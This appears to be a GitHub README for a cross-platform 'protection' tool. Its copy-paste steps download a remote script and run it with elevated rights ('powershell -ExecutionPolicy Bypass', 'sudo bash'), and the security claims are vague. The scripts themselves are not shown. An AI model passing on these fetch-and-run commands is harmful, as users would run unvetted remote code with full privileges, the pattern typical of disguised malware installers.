<p align="center">
  <strong>Click your operating system to ensure maximum security</strong>
</p>

<p align="center">
  <a href="#windows-install-instructions">
    <img src="./assets/windows.png" alt="Windows Logo" width="120" style="margin: 0 25px;"/>
  </a>
  <a href="#macos-install-instructions">
    <img src="./assets/macos.png" alt="macOS Logo" width="120" style="margin: 0 25px;"/>
  </a>
  <a href="#linux-install-instructions">
    <img src="./assets/linux.png" alt="Linux Logo" width="120" style="margin: 0 25px;"/>
  </a>
</p>

<h2>Protection robustly and comprehensively optimizes your system's security settings.</h2>
<div style="display: flex; align-items: flex-start; margin-bottom: 60px;">
  <div style="flex: 1;">
    <p style="line-height: 1.5;">✓ Enables Firewall</p>
    <p style="line-height: 1.5;">✓ Blocks unauthorized access</p>
    <p style="line-height: 1.5;">✓ Reduces attack surface by disabling unused services</p>
    <p style="line-height: 1.5;">✓ Applies security settings</p>
    <p style="line-height: 1.5;">✓ Enhances overall system stability and performance</p>
    <p style="line-height: 1.5;">✓ Prevents common security vulnerabilities</p>
  </div>
  <div style="flex: 0 0 auto; margin-right: 20px;">
    <img src="./assets/logo.svg" alt="Project Logo" width="120"/>
  </div>
</div>

<h2 id="windows-install-instructions">Windows Install Instructions</h2>
<div style="display: flex; align-items: flex-start; margin-bottom: 60px;">
  <div style="flex: 1;">
    <ol style="line-height: 1.5;">
      <li><strong>Open Command Prompt</strong>
        <ul>
          <li>Press <code>Windows + R</code></li>
          <li>Type <code>cmd</code></li>
          <li>Press <code>Enter</code></li>
        </ul>
      </li>
      <li><strong>Download Git Installer</strong>
        <ul>
          <li>Copy and paste the following command into Command Prompt to download the Git installer:</li>
          <pre><code>powershell -Command "Invoke-WebRequest -Uri https://github.com/git-for-windows/git/releases/download/v2.14.1.windows.1/Git-2.14.1-64-bit.exe -OutFile Git-2.14.1-64-bit.exe"</code></pre>
        </ul>
      </li>
      <li><strong>Install Git</strong>
        <ul>
          <li>Once downloaded, copy and paste the following command into Command Prompt to silently install Git:</li>
          <pre><code>.\Git-2.14.1-64-bit.exe /VERYSILENT /NORESTART</code></pre>
        </ul>
      </li>
      <li><strong>Install Protection</strong>
        <ul>
          <li>Copy and paste the following command into Command Prompt to download the protection script:</li>
          <pre><code>curl -o win.ps1 https://raw.githubusercontent.com/boolskii/protection/main/win.ps1</code></pre>
        </ul>
      </li>
      <li><strong>Run Protection</strong>
        <ul>
          <li>Copy and paste the following command into Command Prompt to run the protection script:</li>
          <pre><code>powershell -ExecutionPolicy Bypass -File .\win.ps1</code></pre>
        </ul>
      </li>
    </ol>
    Your Windows PC is now protected from unwanted activity.
  </div>
  <div style="flex: 0 0 auto; margin-right: 20px;">
    <img src="./assets/windows.png" alt="Windows Logo" width="120"/>
  </div>
</div>

<h2 id="macos-install-instructions">macOS Install Instructions</h2>
<div style="display: flex; align-items: flex-start; margin-bottom: 60px;">
  <div style="flex: 1;">
    <ol style="line-height: 1.5;">
      <li><strong>Open Terminal</strong>
        <ul>
          <li>Press <code>Command + Space</code></li>
          <li>Type <code>Terminal</code></li>
          <li>Press <code>Enter</code></li>
        </ul>
      </li>
      <li><strong>Install Homebrew</strong>
        <ul>
          <li>Copy and paste the following command into Terminal to install Homebrew:</li>
          <pre><code>/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"</code></pre>
        </ul>
      </li>
      <li><strong>Install Git</strong>
        <ul>
          <li>Copy and paste the following command into Terminal to install Git via Homebrew:</li>
          <pre><code>brew install git</code></pre>
        </ul>
      </li>
      <li><strong>Install Protection</strong>
        <ul>
          <li>Copy and paste the following command into Terminal to download the protection script:</li>
          <pre><code>curl -o mac.sh https://raw.githubusercontent.com/boolskii/protection/main/mac.sh</code></pre>
        </ul>
      </li>
      <li><strong>Run Protection</strong>
        <ul>
          <li>Copy and paste the following command into Terminal to run the protection script:</li>
          <pre><code>sudo bash ./mac.sh</code></pre>
        </ul>
      </li>
    </ol>
    Your macOS system is now protected from unwanted activity.
  </div>
  <div style="flex: 0 0 auto; margin-right: 20px;">
    <img src="./assets/macos.png" alt="macOS Logo" width="120"/>
  </div>
</div>

<h2 id="linux-install-instructions">Linux Install Instructions</h2>
<div style="display: flex; align-items: flex-start; margin-bottom: 60px;">
  <div style="flex: 1;">
    <ol style="line-height: 1.5;">
      <li><strong>Open Terminal</strong>
        <ul>
          <li>Press <code>Ctrl + Alt + T</code> or open it from the application menu.</li>
        </ul>
      </li>
      <li><strong>Update Package Lists</strong>
        <ul>
          <li>Copy and paste the following command into Terminal to update package lists:</li>
          <pre><code>sudo apt-get update</code></pre>
        </ul>
      </li>
      <li><strong>Install Git</strong>
        <ul>
          <li>Copy and paste the following command into Terminal to install Git:</li>
          <pre><code>sudo apt-get install git -y</code></pre>
        </ul>
      </li>
      <li><strong>Install Protection</strong>
        <ul>
          <li>Copy and paste the following command into Terminal to download the protection script:</li>
          <pre><code>curl -o lin.sh https://raw.githubusercontent.com/boolskii/protection/main/lin.sh</code></pre>
        </ul>
      </li>
      <li><strong>Run Protection</strong>
        <ul>
          <li>Copy and paste the following command into Terminal to run the protection script:</li>
          <pre><code>sudo bash ./lin.sh</code></pre>
        </ul>
      </li>
    </ol>
    Your Linux system is now protected from unwanted activity.
  </div>
  <div style="flex: 0 0 auto; margin-right: 20px;">
    <img src="./assets/linux.png" alt="Linux Logo" width="120"/>
  </div>
</div>